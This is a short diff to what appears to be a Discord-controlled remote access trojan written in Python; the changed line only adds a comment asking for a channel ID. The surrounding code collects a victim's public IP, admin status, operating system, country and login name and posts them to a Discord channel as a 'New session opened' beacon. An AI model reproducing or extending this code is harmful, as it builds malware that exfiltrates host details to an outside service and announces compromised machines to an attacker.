@@ -74,7 +74,7 @@ async def on_ready():
 	ip = get('https://api.ipify.org').text
 	pp = ip
 	import os
-	channel = client.get_channel()
+	channel = client.get_channel() #Put ID of channel here
 	is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 	if is_admin == True:
 		await channel.send("@here :white_check_mark: " + "New session opened " + uuidgen + " | " + platform.system() + " " + platform.release() + " | " + ip + " " + ":flag_" + final + ":" + " | " + "User : " + os.getlogin() + " | " + ":gem:") 
